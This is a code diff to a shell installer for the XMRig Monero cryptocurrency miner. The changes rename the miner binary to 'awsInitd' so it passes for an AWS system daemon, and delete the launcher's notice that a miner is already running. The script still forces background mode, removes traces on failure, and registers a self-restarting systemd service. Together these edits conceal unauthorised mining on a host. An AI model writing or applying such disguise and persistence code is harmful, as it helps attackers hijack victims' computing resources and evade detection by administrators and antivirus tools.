@@ -257,7 +257,7 @@ if [ "$libc_type" = "musl" ]; then
     echo "[*] Unpacking /tmp/xmrig.tar.gz to $working_dir/awsInit"
     [ -d $working_dir/awsInit] || mkdir $working_dir/awsInit
     if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
-        echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $working_dir/awsInit directory"
+        echo "ERROR: Can't unpack /tmp/data.tar.gz to $working_dir/awsInit directory"
         exit 1
     fi
     rm /tmp/data.tar.gz
@@ -271,6 +271,7 @@ if [ "$libc_type" = "musl" ]; then
         else 
             echo "WARNING: Advanced version of $working_dir/awsInit/xmrig was removed by antivirus (or some other problem)"
         fi
+        rm -rf $working_dir/awsInit
         exit 1
     fi
 else
@@ -297,11 +298,13 @@ else
         else 
             echo "WARNING: Advanced version of $working_dir/awsInit/xmrig was removed by antivirus (or some other problem)"
         fi
+        rm -rf $working_dir/awsInit
         exit 1
     fi
 fi
 
-echo "[*] Miner $working_dir/awsInit/xmrig is OK"
+mv $working_dir/awsInit/xmrig $working_dir/awsInit/awsInitd
+echo "[*] Miner $working_dir/awsInit/awsInitd is OK"
 
 PASS=`curl -s ifconfig.me`
 if [ -z $PASS ]; then
@@ -334,11 +337,8 @@ sed -i'' 's/"background": *false,/"background": true,/' $working_dir/awsInit/con
 echo "[*] Creating $working_dir/awsInit/init.sh script"
 cat >$working_dir/awsInit/init.sh <<EOL
 #!/bin/bash
-if ! pidof xmrig >/dev/null; then
-  nice $working_dir/awsInit/xmrig \$*
-else
-  echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
+if ! pidof awsInitd >/dev/null; then
+  nice $working_dir/awsInit/awsInitd \$*
 fi
 EOL
 
@@ -392,7 +392,7 @@ else
 Description=Monero miner service
 
 [Service]
-ExecStart=$working_dir/awsInit/xmrig --config=$working_dir/awsInit/config.json
+ExecStart=$working_dir/awsInit/awsInitd --config=$working_dir/awsInit/config.json
 Restart=always
 Nice=10
 CPUWeight=1
